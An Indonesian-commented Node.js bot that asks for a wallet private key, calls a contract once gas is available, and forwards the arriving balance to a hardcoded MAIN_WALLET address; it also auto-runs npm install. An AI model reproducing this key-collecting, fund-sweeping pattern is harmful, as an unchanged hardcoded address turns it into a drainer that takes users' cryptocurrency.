#!/usr/bin/env node

// Auto install dependencies kalau belum ada
{
  const { execSync } = require("child_process");
  const fsPath = require("fs");
  if (!fsPath.existsSync(__dirname + "/node_modules")) {
      console.log("📦 Dependencies belum ada, menginstall...");
      execSync("npm install", { cwd: __dirname, stdio: "inherit" });
  }
}
const { ethers } = require('ethers');
const promptSync = require('prompt-sync');
const qrcode = require('qrcode-terminal');

const prompt = promptSync();
const MAIN_WALLET = '0x459dc0dCB82c7E3c791041F9cdb5F797b6459315'; // Ganti ke wallet utama kamu

const PRIVATE_KEY = prompt('Masukkan PRIVATE KEY kamu: ').trim();
const CONTRACT = prompt('Masukkan alamat KONTRAK: ').trim();
const CALLDATA = prompt('Masukkan CALLDATA (kosongkan jika tidak ada): ').trim();
const RPC = prompt('Masukkan RPC URL: ').trim();
const INTERVAL = parseInt(prompt('Masukkan interval pengecekan (ms): ').trim()) || 3000;

const provider = new ethers.JsonRpcProvider(RPC);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

async function main() {
  const address = await wallet.getAddress();

  console.log(`\nMonitoring wallet: ${address}`);
  console.log(`[i] Interval pengecekan diset: ${INTERVAL} ms`);

  let isProcessing = false;

  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  function printQRCode(addr) {
    console.log('\n[i] QR Code untuk mengisi saldo ke wallet ini:');
    qrcode.generate(addr, { small: true });
  }

  async function getDynamicFee() {
    const feeData = await provider.getFeeData();
    // fallback ke 5 gwei kalau tidak tersedia
    const baseFee = feeData.gasPrice ?? feeData.maxFeePerGas ?? ethers.parseUnits('5', 'gwei');
    const bumpedGas = baseFee + baseFee / 3n;
    return { gasPrice: bumpedGas };
  }

  printQRCode(address);

  while (true) {
    try {
      if (isProcessing) {
        await sleep(INTERVAL);
        continue;
      }

      const balance = await provider.getBalance(address);
      const nonce = await provider.getTransactionCount(address, 'latest');
      const { gasPrice } = await getDynamicFee();

      // Estimasi gas dinamis
      const estimateGas = await provider.estimateGas({
        from: address,
        to: CONTRACT,
        data: CALLDATA || '0x',
      });

      const totalCost = gasPrice * estimateGas;
      console.log(`[i] Minimal saldo agar bisa diproses (biaya gas): ${ethers.formatEther(totalCost)} ETH`);

      if (balance < totalCost) {
        await sleep(INTERVAL);
        continue;
      }

      isProcessing = true;

      const txUnsigned = {
        to: CONTRACT,
        data: CALLDATA || '0x',
        gasLimit: estimateGas,
        gasPrice,
        nonce,
      };

      // Kirim transaksi langsung tanpa sign manual
      const tx = await wallet.sendTransaction(txUnsigned);
      console.log(`[✓] TX ke kontrak dikirim: ${tx.hash}`);

      // Pantau reward
      console.log(`[i] Menunggu saldo reward masuk...`);
      let tries = 0;
      while (tries < 30) {
        const rewardBal = await provider.getBalance(address);
        const rewardNonce = await provider.getTransactionCount(address, 'latest');
        const sendCost = 100000n * gasPrice;

        if (rewardBal > sendCost) {
          const tx2 = await wallet.sendTransaction({
            to: MAIN_WALLET,
            value: rewardBal - sendCost,
            gasLimit: 100000n,
            gasPrice,
            nonce: rewardNonce,
          });
          console.log(`[✓] Reward terkirim ke wallet utama: ${tx2.hash}`);
          break;
        }

        tries++;
        await sleep(INTERVAL);
      }

      isProcessing = false;
    } catch (err) {
      console.error('[!] ERROR:', err.message || err);
      isProcessing = false;
      await sleep(INTERVAL);
    }
  }
}

main();
